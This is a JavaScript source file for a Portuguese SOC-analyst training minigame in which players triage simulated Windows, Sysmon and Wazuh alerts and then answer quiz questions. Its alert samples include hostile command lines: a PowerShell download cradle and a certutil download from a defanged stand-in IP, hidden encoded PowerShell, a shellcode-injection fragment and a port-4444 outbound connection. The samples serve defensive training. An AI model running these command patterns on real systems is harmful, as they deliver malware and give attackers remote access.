/* ===================== Minigame: Turno da Madrugada ===================== */
(function(){
"use strict";
const Q = window.SOC_QDATA;
const $ = s => document.querySelector(s);
const esc = s => String(s).replace(/[&<>"]/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
const rich = s => esc(s).replace(/`([^`]+)`/g, "<code>$1</code>");
const R = n => Math.floor(Math.random() * n);
const pick = a => a[R(a.length)];
const shuffle = a => { a = a.slice(); for (let i = a.length - 1; i > 0; i--){ const j = R(i + 1); [a[i], a[j]] = [a[j], a[i]]; } return a; };
const two = n => String(n).padStart(2, "0");
const hhmm = (h0, h1) => `${two(h0 + R(h1 - h0))}:${two(R(60))}:${two(R(60))}`;
const BEST_KEY = "simulado-soc-n1-game-v1";
let best = {}; try { best = JSON.parse(localStorage.getItem(BEST_KEY) || "{}") || {}; } catch(e) { best = {}; }
const saveBest = () => { try { localStorage.setItem(BEST_KEY, JSON.stringify(best)); } catch(e) {} };

const DIFF = {
  facil:   { name:"Estagiário",      t:30, alerts:6,  hp:4, bossT:50, levels:["conceito"],                 hint:true,  storm:false, mult:1 },
  medio:   { name:"Analista N1",     t:18, alerts:8,  hp:6, bossT:35, levels:["conceito","investigacao"],  hint:false, storm:true,  mult:1.5 },
  dificil: { name:"Plantão crítico", t:10, alerts:10, hp:8, bossT:22, levels:["investigacao","entrevista"], hint:false, storm:true, mult:2 }
};
const PHASES = [
  { topic:"phishing",   name:"Fase 1 · Acesso inicial", sub:"phishing Falso DETRAN" },
  { topic:"smb",        name:"Fase 2 · Credenciais",    sub:"brute force SMB" },
  { topic:"powershell", name:"Fase 3 · Execução",       sub:"PowerShell codificado" },
  { topic:"soc",        name:"Fase final · Contra o SOC", sub:"Wazuh e triagem" }
];
const MAXL = 4;

/* ---------- alertas (baseados no lab; os hipotéticos estão marcados como tal no texto) ---------- */
const U = ["maria.souza","ana.lima","carlos.r","paulo.m"];
const ALERTS = [
 { v:"mal", mk:() => ({ src:"Wazuh 60204 · Security 4625", rule:"60204", sev:10, title:"Multiple Windows Logon Failures",
   f:[["eventID","4625 ×8 em 14 s"],["ipAddress","10.0.10.30"],["targetUserName","joao.teste"],["subStatus","0xC000006A"],["logonType","3 (rede)"]],
   hint:"Muitas falhas, mesma origem, poucos segundos.", mitre:"T1110",
   why:"Rajada de falhas pela rede, do mesmo IP, com senha errada para uma conta que existe (0xC000006A). É o brute force do Cenário 1." }) },
 { v:"mal", mk:() => ({ src:"Wazuh 92652 · Security 4624", rule:"92652", sev:6, title:"Successful Remote Logon Detected (NTLM)",
   f:[["eventID","4624"],["ipAddress","10.0.10.30"],["targetUserName","joao.teste"],["logonType","3 (rede)"],["authPackage","NTLM"]],
   ctx:"Cinco segundos antes, a regra 60204 disparou para o mesmo IP.", hint:"O que veio logo antes deste sucesso?", mitre:"T1110 → T1078",
   why:"Nível 6 parece pouco, mas é o sucesso logo depois da rajada de falhas: a senha foi descoberta. Conta comprometida, escalar já." }) },
 { v:"mal", mk:() => ({ src:"Sysmon EID 1 · criação de processo", sev:12, title:"PowerShell oculto iniciado pelo Word",
   f:[["image","powershell.exe"],["parentImage","WINWORD.EXE"],["commandLine","powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi…"],["user", pick(U)]],
   hint:"Quem é o processo pai?", mitre:"T1566.001 · T1059.001",
   why:"Word abrindo PowerShell escondido com Base64 é o padrão clássico de macro maliciosa. O começo do Base64 decodifica para IEX (New-Ob… (teste na aba Ferramentas)." }) },
 { v:"mal", mk:() => ({ src:"Security 4625 · correlação", sev:10, title:"Falhas de logon em muitas contas diferentes",
   f:[["contas atingidas","17, uma tentativa cada"],["ipAddress","10.0.10.30"],["subStatus","0xC000006A"],["janela","40 s"]],
   hint:"Uma tentativa por conta também é um padrão.", mitre:"T1110.003",
   why:"Password spraying: uma senha comum testada em muitas contas, uma vez cada, para não bloquear nenhuma. Uma regra por conta não pega; olhar a origem pega." }) },
 { v:"mal", mk:() => ({ src:"PowerShell/Operational 4104", rule:"100210", sev:4, title:"Script block executado",
   f:[["scriptBlockText","IEX (New-Object Net.WebClient).DownloadString('hxxp://203.0.113.50/a.ps1')"],["user", pick(U)],["host","SOC-Win11"]],
   hint:"Leia o texto do script, não o nível.", mitre:"T1059.001 · T1105",
   why:"Baixa um script da internet e executa direto na memória (IEX). Nível 4 da 100210 é baixo porque a regra alerta todo 4104: quem decide é o conteúdo." }) },
 { v:"mal", mk:() => ({ src:"E-mail reportado pelo usuário", sev:8, title:"NOTIFICAÇÃO: sua CNH será suspensa",
   f:[["From","infracao@detran-multas[.]top"],["SPF / DKIM / DMARC","none / none / none"],["Link","hxxps://gov.br@login-cnh[.]run[.]app/"],["Prazo","2 dias"]],
   hint:"Para onde o link leva de verdade?", mitre:"T1566.002",
   why:"O gov.br está antes do @ (userinfo), então o destino é login-cnh.run.app. Domínio que não é .gov.br, sem autenticação e com prazo curto: phishing." }) },
 { v:"mal", mk:() => ({ src:"System 7045 · serviço instalado", sev:12, title:"Novo serviço com PowerShell oculto",
   f:[["ServiceName","WinUpdSvc"],["ImagePath","%COMSPEC% /c powershell -nop -w hidden -enc JABjAD0A…"],["StartType","auto"],["Conta","LocalSystem"]],
   hint:"Serviço legítimo costuma apontar para um .exe em Program Files.", mitre:"T1543.003",
   why:"Serviço que chama cmd e PowerShell escondido com Base64 é persistência (e às vezes execução remota). Nome parecido com Windows Update é disfarce." }) },
 { v:"mal", mk:() => ({ src:"Security 4720 · conta criada", sev:8, title:"Conta de usuário criada de madrugada",
   f:[["TargetUserName","helpdesk2"],["SubjectUserName","joao.teste"],["horário", hhmm(2,5)]],
   ctx:"joao.teste não é do TI e fez logon pela rede, vindo de 10.0.10.30, minutos antes.", hint:"Quem criou a conta, e de onde ele veio?", mitre:"T1136.001",
   why:"Conta criada fora do horário por uma conta que acabou de ser comprometida é persistência: o atacante garante uma porta de volta." }) },
 { v:"mal", mk:() => ({ src:"Security 1102", sev:12, title:"O log de auditoria foi apagado",
   f:[["SubjectUserName","joao.teste"],["horário", hhmm(1,5)],["host","SOC-Win11"]],
   hint:"Quem limpa log fora de uma mudança aprovada?", mitre:"T1070.001",
   why:"Apagar o log Security é cobrir rastros. Sem mudança aprovada, é incidente. O SIEM já tinha uma cópia dos eventos: por isso centralizar logs importa." }) },
 { v:"mal", mk:() => ({ src:"Sysmon EID 3 · conexão de rede", sev:10, title:"PowerShell conectando a porta incomum",
   f:[["image","powershell.exe"],["destinationIp","203.0.113.50"],["destinationPort","4444"],["user", pick(U)]],
   hint:"4444 é uma porta famosa.", mitre:"T1071 · T1571",
   why:"4444 é a porta padrão de reverse shell em ferramentas de ataque. PowerShell abrindo conexão de saída para um IP externo nessa porta pede contenção." }) },
 { v:"mal", mk:() => ({ src:"Sysmon EID 1 · criação de processo", sev:10, title:"certutil baixando um executável",
   f:[["image","certutil.exe"],["commandLine","certutil -urlcache -split -f hxxp://203.0.113.50/p.exe C:\\Users\\Public\\p.exe"],["parentImage","cmd.exe"]],
   hint:"certutil serve para certificados.", mitre:"T1105",
   why:"Ferramenta nativa do Windows usada para baixar arquivo (LOLBin), salvando um .exe em pasta pública. Uso clássico de atacante." }) },
 { v:"mal", mk:() => ({ src:"Sysmon EID 13 · registro", sev:10, title:"Valor criado na chave Run",
   f:[["targetObject","HKCU\\…\\CurrentVersion\\Run\\Updater"],["details","C:\\Users\\Public\\upd.exe"],["image","powershell.exe"]],
   hint:"O que roda sozinho a cada logon?", mitre:"T1547.001",
   why:"A chave Run executa o programa a cada logon. Executável em C:\\Users\\Public gravado pelo PowerShell é persistência maliciosa." }) },
 { v:"mal", mk:() => ({ src:"Wazuh 60122 ×12 · Security 4625", rule:"60122", sev:5, title:"Falhas de logon com usuários inexistentes",
   f:[["targetUserName","admin, administrador, root, teste, backup…"],["subStatus","0xC0000064"],["ipAddress","10.0.10.30"],["janela","30 s"]],
   hint:"0xC0000064 quer dizer o quê?", mitre:"T1110 · T1087",
   why:"0xC0000064 é usuário inexistente. Vários nomes comuns em sequência, da mesma origem, é alguém adivinhando contas antes do brute force." }) },
 { v:"mal", mk:() => ({ src:"PowerShell/Operational 4104", rule:"100210", sev:4, title:"Script block executado",
   f:[["scriptBlockText","$b=[Convert]::FromBase64String($p); $a=[W32]::VirtualAlloc(0,$b.Length,0x3000,0x40)…"],["user", pick(U)]],
   hint:"VirtualAlloc em script de usuário comum?", mitre:"T1059.001 · T1055",
   why:"Decodificar bytes e alocar memória executável (0x40) é o começo de injeção de shellcode. Usuário comum não faz isso." }) },

 { v:"ben", mk:() => ({ src:"Wazuh 60122 · Security 4625", rule:"60122", sev:5, title:"Windows Logon Failure",
   f:[["targetUserName", pick(U)],["logonType","2 (interativo)"],["subStatus","0xC000006A"],["horário", hhmm(8,10)]],
   ctx:"Um 4624 da mesma conta, no mesmo computador, 20 s depois. Nenhuma outra falha no dia.", hint:"Uma falha só, e depois sucesso no teclado.",
   why:"Uma falha isolada, no próprio teclado, seguida de sucesso: senha digitada errado. Feche com nota. O que pesaria seria repetição, outra origem ou várias contas." }) },
 { v:"ben", mk:() => ({ src:"Wazuh 60106 · Security 4624", rule:"60106", sev:3, title:"Windows Logon Success",
   f:[["targetUserName","SISTEMA"],["logonType","5 (serviço)"],["processName","services.exe"],["ipAddress","(vazio)"]],
   hint:"logonType 5 é de quem?",
   why:"logonType 5 é o services.exe iniciando serviços como SISTEMA. Acontece o tempo todo. No Cenário 1, era o ruído misturado ao ataque." }) },
 { v:"ben", mk:() => ({ src:"Wazuh 92058 · Sysmon EID 1", rule:"92058", sev:12, title:"sdbinst.exe executado",
   f:[["image","sdbinst.exe"],["user","SYSTEM"],["parent","svchost.exe -s PcaSvc"],["frequência","quase toda hora"]],
   hint:"Quem é o pai, e o padrão se repete igual?",
   why:"O pai é o serviço de compatibilidade do Windows (PcaSvc) e o padrão é recorrente e igual: tarefa nativa. Registre e, se valer, crie exceção exata." }) },
 { v:"ben", mk:() => ({ src:"Wazuh 92213 · Sysmon EID 11", rule:"92213", sev:15, title:"Arquivo de script criado em pasta temporária",
   f:[["targetFilename","…\\Temp\\__PSScriptPolicyTest_x1y2z3.ps1"],["image","powershell.exe"],["user", pick(U)]],
   hint:"Nível 15 é sempre grave?",
   why:"O PowerShell cria esse arquivo sozinho para testar a política de execução. Foi falso positivo no lab, mesmo com nível 15. O nível prioriza; o contexto decide." }) },
 { v:"ben", mk:() => ({ src:"Sysmon EID 3 · conexão de rede", sev:3, title:"Conexão de saída HTTPS",
   f:[["image","C:\\Users\\…\\Microsoft\\OneDrive\\OneDrive.exe"],["destinationPort","443"],["destino","Microsoft"],["user", pick(U)]],
   hint:"Processo esperado, destino esperado, porta esperada.",
   why:"OneDrive sincronizando com a Microsoft na 443 é tráfego normal. Processo, destino e porta batem com o esperado." }) },
 { v:"ben", mk:() => ({ src:"System 7045 · serviço instalado", sev:8, title:"Novo serviço instalado",
   f:[["ServiceName","Google Update Service (gupdate)"],["ImagePath","\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc"],["horário", hhmm(10,16)]],
   ctx:"O TI instalou o Chrome nessa máquina hoje (mudança CHG-1042 aprovada).", hint:"Tem mudança aprovada?",
   why:"Executável assinado em Program Files, instalado durante uma mudança aprovada. Feche citando a mudança." }) },
 { v:"ben", mk:() => ({ src:"Security 4740 · conta bloqueada", sev:5, title:"Conta bloqueada",
   f:[["targetUserName", pick(U)],["callerComputer","celular da usuária"],["horário", hhmm(8,11)]],
   ctx:"A senha foi trocada ontem. O celular ainda tenta sincronizar o e-mail com a senha antiga.", hint:"De onde vêm as tentativas?",
   why:"Dispositivo com senha antiga salva causa bloqueios repetidos. Oriente a usuária a atualizar a senha no celular. Se a origem fosse desconhecida, seria outra história." }) },
 { v:"ben", mk:() => ({ src:"Security 4624", sev:3, title:"Logon interativo",
   f:[["targetUserName","igor"],["logonType","2 (interativo)"],["workstation","SOC-Win11"],["horário", hhmm(8,10)]],
   hint:"Pessoa certa, máquina certa, hora certa.",
   why:"Logon no teclado da própria máquina, em horário comercial. É o normal: o 4624 sozinho não é suspeito." }) },
 { v:"ben", mk:() => ({ src:"Security 4625 · Security 4624", sev:5, title:"Falha e sucesso logo em seguida",
   f:[["falha","joao.tste · 0xC0000064"],["sucesso","joao.teste · 15 s depois"],["origem","mesma estação, interativo"]],
   hint:"Compare os dois nomes.",
   why:"Usuário digitou o nome errado (joao.tste não existe) e acertou em seguida, na mesma máquina. Erro de digitação." }) },
 { v:"ben", mk:() => ({ src:"IDS · varredura de portas", sev:8, title:"Port scan na rede interna",
   f:[["origem","10.0.10.50 (scanner de vulnerabilidades)"],["horário", hhmm(2,4)],["alvos","rede inteira"]],
   ctx:"O IP está no inventário como scanner e a janela de manutenção é 02:00–04:00.", hint:"Está no inventário e na janela?",
   why:"Varredura autorizada, de ativo conhecido, dentro da janela combinada. Feche citando o agendamento (e confira se o horário bate)." }) },
 { v:"ben", mk:() => ({ src:"PowerShell/Operational 4104", rule:"100210", sev:4, title:"Script block executado",
   f:[["scriptBlockText","Get-Service | Where-Object Status -eq 'Running'"],["user","ti.ana"],["sessão","interativa"]],
   ctx:"ti.ana está atendendo o chamado INC-2231 nessa máquina.", hint:"Comando de leitura, feito por quem?",
   why:"Só lista serviços em execução, feito pela analista de TI durante um chamado. A 100210 alerta todo 4104; nem todo 4104 é ataque." }) },
 { v:"ben", mk:() => ({ src:"Gateway de e-mail", sev:3, title:"Newsletter de fornecedor",
   f:[["From","news@fornecedor-conhecido.com.br"],["SPF / DKIM / DMARC","pass / pass / pass"],["Links","todos para fornecedor-conhecido.com.br"],["Tom","informativo, sem prazo"]],
   ctx:"O domínio é de um fornecedor que a empresa já usa.", hint:"Domínio conhecido, links no mesmo domínio, sem pressão.",
   why:"Domínio real de um fornecedor conhecido, links para o mesmo domínio, sem urgência. 'pass' sozinho não basta, mas aqui o domínio é o oficial." }) },
 { v:"ben", mk:() => ({ src:"Sysmon EID 1 · criação de processo", sev:3, title:"PowerShell aberto",
   f:[["image","powershell.exe"],["parentImage","explorer.exe"],["commandLine","\"powershell.exe\""],["user","ti.ana"],["integrityLevel","Medium"]],
   hint:"Sem -enc, sem -w hidden, aberto pelo Explorer.",
   why:"Usuária abriu o PowerShell pelo menu, sem argumentos. Abrir PowerShell não é ataque; o que pesaria seria Base64, janela oculta ou pai estranho." }) }
];

/* ---------- estado ---------- */
const G = { st:"menu", d:null, dk:null, lives:MAXL, score:0, combo:0, maxCombo:0, hits:0, miss:0, queue:[], qi:0, pool:[], hp:0, hpMax:0, turn:0,
            storm:null, cur:null, usedQ:new Set(), missed:[], paused:false, pausedAt:0, after:null, active:false };

/* ---------- HUD ---------- */
const HEART = `<svg viewBox="0 0 24 22" class="heart" aria-hidden="true"><path fill="currentColor" d="M12 21.3 10.3 19.8C4.4 14.4.5 10.9.5 6.6.5 3.1 3.2.5 6.6.5c1.9 0 3.8.9 5.4 2.4C13.6 1.4 15.5.5 17.4.5c3.4 0 6.1 2.6 6.1 6.1 0 4.3-3.9 7.8-9.8 13.2z"/></svg>`;
let lastLives = MAXL;
function hud(){
  const h = $("#gHearts"); h.innerHTML = Array.from({length:MAXL}, () => HEART).join("");
  [...h.children].forEach((el, i) => { if (i >= G.lives) el.classList.add("lost"); if (G.lives > lastLives && i === G.lives - 1) el.classList.add("pop"); });
  lastLives = G.lives; h.setAttribute("aria-label", `${G.lives} de ${MAXL} vidas`);
  $("#gScore").textContent = G.score.toLocaleString("pt-BR");
  $("#gCombo").textContent = "×" + G.combo;
  $("#gStage").textContent = G.st === "wave" ? `fila ${G.qi}/${G.queue.length}` : (G.st === "boss" || G.st === "bossIntro") ? "chefão" : "—";
  $("#gDiffName").textContent = G.d ? `recorde · ${G.d.name}` : "recorde";
  $("#gBest").textContent = G.dk && best[G.dk] ? best[G.dk].toLocaleString("pt-BR") : "—";
  $("#gPauseBtn").hidden = !(G.st === "wave" || G.st === "boss");
}
function phaseIdx(){ return Math.min(3, Math.floor((1 - G.hp / G.hpMax) * 4)); }
const enraged = () => G.hp <= Math.ceil(G.hpMax / 3);
function bossHud(){
  $("#gBossHp").style.width = Math.max(0, G.hp / G.hpMax * 100) + "%";
  const ph = PHASES[phaseIdx()];
  $("#gBossPhase").textContent = `${ph.name} · ${G.hp}/${G.hpMax} HP${enraged() && G.hp > 0 ? " · FURIOSO" : ""}`;
}
const sevClass = s => s >= 12 ? "s3" : s >= 8 ? "s2" : s >= 4 ? "s1" : "s0";
const sevName = s => s >= 12 ? "crítica" : s >= 8 ? "alta" : s >= 4 ? "média" : "baixa";
const sevVar = s => s >= 12 ? "--alert" : s >= 8 ? "--fail" : s >= 4 ? "--info" : "--noise";

/* ---------- menus ---------- */
function showMenu(html){ const m = $("#gMenu"); m.innerHTML = html; m.hidden = false; }
function hideMenu(){ $("#gMenu").hidden = true; }
function diffButtons(){
  return `<div class="diffs">${Object.entries(DIFF).map(([k, d], i) => `<button class="diff d-${k}" type="button" data-diff="${k}">
    <b>${esc(d.name)}</b><span>${d.alerts} alertas · ${d.t} s cada</span><span>Chefão: ${d.hp} HP · ${d.bossT} s por ataque</span>
    <code>tecla ${i+1} · recorde ${best[k] ? best[k].toLocaleString("pt-BR") : "—"}</code></button>`).join("")}</div>`;
}
function bindDiffs(){ document.querySelectorAll("#gMenu .diff").forEach(b => b.onclick = () => start(b.dataset.diff)); }
function rulesPanel(){
  return `<div class="acard rules"><h3>Como jogar</h3>
    <ul><li>Cada alerta vem como um pacote andando até o SOC. Decida antes que ele chegue: <b>benigno · fechar</b> <kbd>1</kbd> ou <b>malicioso · escalar</b> <kbd>2</kbd>.</li>
    <li>Erro ou tempo esgotado custa <b>1 das 4 vidas</b>. A cada 5 acertos seguidos você recupera uma.</li>
    <li>Responder rápido e manter o combo multiplica os pontos.</li>
    <li>Depois da fila chega <b>O Operador</b>, o chefão que junta os três ataques do portfólio. Cada acerto tira 1 HP dele; cada erro, uma vida sua. Com pouca vida ele fica furioso e mais rápido.</li>
    <li>No médio e no difícil, a cada 3 turnos ele solta uma <b>tempestade de alertas</b>: 3 triagens com menos tempo. Sem erros, ele perde 1 HP.</li></ul>
    <p class="sub2" style="margin-top:8px"><kbd>Enter</kbd> continua · <kbd>P</kbd> pausa. As perguntas do chefão vêm do próprio simulado. Os alertas são inspirados no lab; os que não aconteceram nele são hipotéticos.</p></div>`;
}
function menu(){
  G.st = "menu"; G.cur = null; G.after = null; A.reset(); $("#gBoss").hidden = true; setTime(0);
  showMenu(`<h3>Turno da Madrugada</h3><p>Você está sozinho no plantão do SOC. Faça a triagem da fila de alertas e depois enfrente O Operador. Você tem 4 vidas.</p>${diffButtons()}`);
  bindDiffs(); $("#gPanel").innerHTML = rulesPanel(); hud();
}

/* ---------- fluxo ---------- */
function start(dk){
  const d = DIFF[dk];
  Object.assign(G, { st:"wave", d, dk, lives:MAXL, score:0, combo:0, maxCombo:0, hits:0, miss:0, qi:0, hp:d.hp, hpMax:d.hp, turn:0,
                     storm:null, cur:null, usedQ:new Set(), missed:[], paused:false, after:null });
  lastLives = MAXL;
  const mal = shuffle(ALERTS.filter(a => a.v === "mal")), ben = shuffle(ALERTS.filter(a => a.v === "ben"));
  const nMal = Math.ceil(d.alerts * .55);
  const chosen = [...mal.slice(0, nMal), ...ben.slice(0, d.alerts - nMal)];
  G.queue = shuffle(chosen); G.pool = shuffle(ALERTS.filter(a => !chosen.includes(a)));
  hideMenu(); A.reset(); A.showBoss(false); $("#gBoss").hidden = true; hud(); nextAlert();
}
const inst = t => Object.assign(t.mk(), { v:t.v });
function nextAlert(){
  if (G.qi >= G.queue.length) return bossIntro();
  const t = G.queue[G.qi++]; present(inst(t), G.d.t, `alerta ${G.qi}/${G.queue.length}`, false);
}
function present(a, T, counter, storm){
  G.cur = { kind:"alert", a, T:T * 1000, t0:performance.now(), done:false, storm };
  hud(); renderAlert(a, counter, storm); A.spawnPacket(sevVar(a.sev), "ALERTA · " + sevName(a.sev).toUpperCase());
}
function showCard(){ const c = $("#gCard"); if (!c) return; const r = c.getBoundingClientRect(); if (r.bottom > innerHeight || r.top < 0) c.scrollIntoView({ block:"nearest", behavior:"smooth" }); }
function renderAlert(a, counter, storm){
  $("#gPanel").innerHTML = `<div class="acard${storm ? " boss" : ""}" id="gCard">
    <div class="ctimer" aria-hidden="true"><em></em></div>
    <div class="ahead"><span class="sev ${sevClass(a.sev)}">${sevName(a.sev)}${a.rule ? " · nível " + a.sev : ""}</span><span>${esc(a.src)}</span><span class="cnt">${esc(counter)}</span></div>
    <p class="ask">Novo alerta na fila. Leia os campos e decida:</p>
    <h3 class="atitle">${esc(a.title)}</h3>
    <div class="fgrid">${a.f.map(([k,v]) => `<div class="fcell${v.length > 34 ? " wide" : ""}"><span>${esc(k)}</span><b>${esc(v)}</b></div>`).join("")}</div>
    ${a.ctx ? `<p class="ctx"><b>Contexto:</b> ${esc(a.ctx)}</p>` : ""}
    ${G.d.hint && a.hint ? `<p class="hint"><b>Dica:</b> ${esc(a.hint)}</p>` : ""}
    <div class="acts">
      <button class="act ben" type="button" data-c="ben"><kbd>1</kbd><span><b>Benigno · fechar</b><small>atividade normal ou falso positivo</small></span></button>
      <button class="act mal" type="button" data-c="mal"><kbd>2</kbd><span><b>Malicioso · escalar</b><small>abrir incidente e escalar ao N2</small></span></button>
    </div>
  </div>`;
  document.querySelectorAll("#gCard .act").forEach(b => b.onclick = () => choose(b.dataset.c));
  showCard();
}
function choose(c){ const cur = G.cur; if (!cur || cur.done || cur.kind !== "alert" || G.paused) return; resolveAlert(c); }
const mult = () => (1 + Math.floor(G.combo / 3) * .5) * G.d.mult;
function gain(base, frac){ const p = Math.round((base + base * frac) * mult()); G.score += p; return p; }
function comboLife(){ if (G.combo > 0 && G.combo % 5 === 0 && G.lives < MAXL){ G.lives++; return " · +1 vida pelo combo de 5"; } return ""; }
function resolveAlert(c){
  const cur = G.cur; cur.done = true; const a = cur.a, ok = c === a.v;
  const frac = Math.max(0, 1 - (performance.now() - cur.t0) / cur.T);
  let msg;
  if (ok){ G.combo++; G.hits++; G.maxCombo = Math.max(G.maxCombo, G.combo); msg = `+${gain(100, frac)} pontos` + comboLife(); A.blockPacket(); }
  else { G.combo = 0; G.miss++; G.lives--; G.missed.push(a.title); A.hitCore(); msg = c === null ? "Tempo esgotado: o pacote atingiu o SOC. −1 vida" : "−1 vida"; }
  if (cur.storm){ G.storm.left--; if (ok) G.storm.hits++; }
  hud();
  document.querySelectorAll("#gCard .act").forEach(b => { b.disabled = true; if (b.dataset.c === a.v) b.classList.add("right"); else if (b.dataset.c === c) b.classList.add("wrong"); });
  if (!ok) $("#gCard").classList.add("shake");
  const right = a.v === "mal" ? "Malicioso · escalar" : "Benigno · fechar";
  feedback(ok, ok ? "Certo." : `Era: ${right}.`, a.why, a.mitre, msg);
  G.after = () => { if (G.lives <= 0) return end(false); if (cur.storm) return stormNext(); if (G.st === "wave") return nextAlert(); };
}
function feedback(ok, head, why, mitre, pts){
  const div = document.createElement("div"); div.className = "gfb " + (ok ? "ok" : "bad");
  div.innerHTML = `<div class="verdict"><span class="pill ${ok ? "ok" : "bad"}">${ok ? "Correta" : "Incorreta"}</span><span>${esc(head)}</span></div>
    <p>${rich(why)}</p>${mitre ? `<div class="mitre">MITRE: ${esc(mitre)}</div>` : ""}
    <div class="row"><span class="pts">${esc(pts)}</span><button class="btn primary" type="button" id="gCont">Continuar <kbd>Enter</kbd></button></div>`;
  $("#gPanel").appendChild(div); setTime(0);
  $("#gCont").onclick = cont; $("#gCont").focus({ preventScroll:true });
}
function cont(){ const f = G.after; G.after = null; if (f) f(); }

/* ---------- chefão ---------- */
function bossIntro(){
  G.st = "bossIntro"; G.cur = null; A.clearShots(); A.showBoss(true); $("#gBoss").hidden = false; bossHud(); hud(); setTime(0);
  $("#gPanel").innerHTML = `<div class="acard boss"><div class="ahead"><span class="sev s3">chefão</span><span>fila limpa · ${G.hits} acertos</span></div>
    <h3>O Operador entrou na rede</h3>
    <p style="margin:0 0 8px">É quem está por trás de tudo: mandou o phishing do Falso DETRAN, forçou a senha pelo SMB e rodou PowerShell codificado. Ele ataca com perguntas do simulado, fase por fase.</p>
    <p class="sub2" style="margin:0">${G.hpMax} HP · ${G.d.bossT} s por ataque${G.d.storm ? " · tempestade de alertas a cada 3 turnos" : ""}</p>
    <div class="row" style="margin-top:12px"><button class="btn primary" type="button" id="gCont">Enfrentar <kbd>Enter</kbd></button></div></div>`;
  G.after = bossTurn; $("#gCont").onclick = cont; $("#gCont").focus({ preventScroll:true });
}
function bossTurn(){
  G.st = "boss"; if (G.hp <= 0) return end(true);
  G.turn++; hud();
  if (G.d.storm && G.turn % 3 === 0) return stormStart();
  askBoss();
}
function askBoss(){
  const ph = PHASES[phaseIdx()];
  let pool = Q.filter(q => q.topic === ph.topic && G.d.levels.includes(q.level) && !G.usedQ.has(q.id));
  if (!pool.length) pool = Q.filter(q => q.topic === ph.topic && !G.usedQ.has(q.id));
  if (!pool.length) pool = Q;
  const q = pick(pool); G.usedQ.add(q.id);
  const order = shuffle([0,1,2,3]), T = G.d.bossT * (enraged() ? .75 : 1);
  G.cur = { kind:"q", q, order, T:T * 1000, t0:performance.now(), done:false };
  bossHud(); A.bossCharge();
  $("#gPanel").innerHTML = `<div class="acard boss" id="gCard">
    <div class="ahead"><span class="sev s3">ataque do Operador</span><span>${esc(ph.name)} · ${esc(ph.sub)}</span><span class="cnt">${esc(q.id)}</span></div>
    <div class="ctimer" aria-hidden="true"><em></em></div><p class="ask">O Operador atacou. Responda para contra-atacar:</p>
    <h3 class="atitle">${rich(q.q)}</h3><div class="opts gopts" role="group" aria-label="Alternativas"></div></div>`;
  const box = $("#gCard .opts");
  order.forEach((oi, i) => { const b = document.createElement("button"); b.type = "button"; b.className = "opt"; b.dataset.i = i;
    b.innerHTML = `<span class="k">${"ABCD"[i]}</span><span>${rich(q.options[oi])}</span>`; b.onclick = () => answerQ(i); box.appendChild(b); });
  showCard();
}
function answerQ(i){ const cur = G.cur; if (!cur || cur.done || cur.kind !== "q" || G.paused) return; resolveQ(i); }
function resolveQ(i){
  const cur = G.cur; cur.done = true; const q = cur.q;
  const orig = i == null ? null : cur.order[i], ok = orig === q.answer, rightIdx = cur.order.indexOf(q.answer);
  const frac = Math.max(0, 1 - (performance.now() - cur.t0) / cur.T);
  let msg; const wasEnraged = enraged();
  if (ok){ G.hp--; G.combo++; G.hits++; G.maxCombo = Math.max(G.maxCombo, G.combo); msg = `Golpe no Operador · +${gain(200, frac)} pontos` + comboLife(); A.hitBoss(); }
  else { G.lives--; G.combo = 0; G.miss++; G.missed.push(q.q); A.hitCore(); msg = i == null ? "Tempo esgotado: o ataque atingiu o SOC. −1 vida" : "O ataque atingiu o SOC. −1 vida"; }
  if (!wasEnraged && enraged() && G.hp > 0){ A.enrage(true); msg += " · O Operador ficou furioso"; }
  bossHud(); hud();
  document.querySelectorAll("#gCard .opt").forEach(b => { const k = +b.dataset.i; b.disabled = true;
    if (k === rightIdx) b.classList.add("right"); else if (k === i) b.classList.add("wrong"); else b.classList.add("dim"); });
  if (!ok) $("#gCard").classList.add("shake");
  feedback(ok, ok ? "Isso mesmo." : `Resposta certa: ${"ABCD"[rightIdx]}.`, q.why, "", msg);
  if (window.SOCExplain){ const d = document.createElement("details"); d.className = "gx";
    d.innerHTML = `<summary>Explicação completa: teoria e por que cada alternativa está errada</summary><div></div>`;
    d.addEventListener("toggle", () => { if (d.open && !d.dataset.done){ d.dataset.done = "1"; SOCExplain.render(d.lastElementChild, q, orig, { auto:true, order:cur.order }); } });
    $("#gPanel .gfb:last-child .row").before(d); }
  G.after = () => { if (G.lives <= 0) return end(false); if (G.hp <= 0) return end(true); bossTurn(); };
}
function stormStart(){ G.storm = { left:3, hits:0 }; A.clearShots(); stormNext(); }
function stormNext(){
  if (G.storm.left <= 0){
    const perfect = G.storm.hits === 3; G.storm = null;
    if (perfect){
      G.hp--; G.score += Math.round(150 * G.d.mult); A.hitBoss(); bossHud(); hud();
      if (enraged() && G.hp > 0) A.enrage(true);
      $("#gPanel").innerHTML = `<div class="gfb ok"><div class="verdict"><span class="pill ok">Tempestade contida</span><span>3 de 3 sem erro.</span></div>
        <p>O Operador perdeu 1 HP pela triagem perfeita.</p><div class="row"><span class="pts">+${Math.round(150 * G.d.mult)} pontos</span><button class="btn primary" type="button" id="gCont">Continuar <kbd>Enter</kbd></button></div></div>`;
      G.after = () => { if (G.hp <= 0) return end(true); bossTurn(); }; $("#gCont").onclick = cont; $("#gCont").focus({ preventScroll:true }); return;
    }
    return bossTurn();
  }
  if (!G.pool.length) G.pool = shuffle(ALERTS);
  present(inst(G.pool.pop()), Math.max(5, Math.round(G.d.t * .6)), `tempestade ${4 - G.storm.left}/3`, true);
}

/* ---------- fim ---------- */
function end(win){
  G.st = "end"; G.cur = null; G.after = null; setTime(0); A.clearShots();
  let bonus = 0; if (win){ bonus = Math.round(G.lives * 500 * G.d.mult); G.score += bonus; A.bossDie(); }
  const rec = G.score > (best[G.dk] || 0); if (rec){ best[G.dk] = G.score; saveBest(); }
  hud();
  const acc = G.hits + G.miss ? Math.round(G.hits * 100 / (G.hits + G.miss)) : 0;
  showMenu(`<h3>${win ? "O Operador caiu" : "Fim de plantão"}</h3>
    <div class="big">${G.score.toLocaleString("pt-BR")}</div>
    <p>${win ? `Vitória no ${esc(G.d.name)} com ${G.lives} vida(s) sobrando (+${bonus.toLocaleString("pt-BR")} de bônus).` : `As 4 vidas acabaram${G.turn > 0 ? `, com O Operador em ${G.hp}/${G.hpMax} HP` : ` na fila de alertas (${G.qi}/${G.queue.length})`}.`}
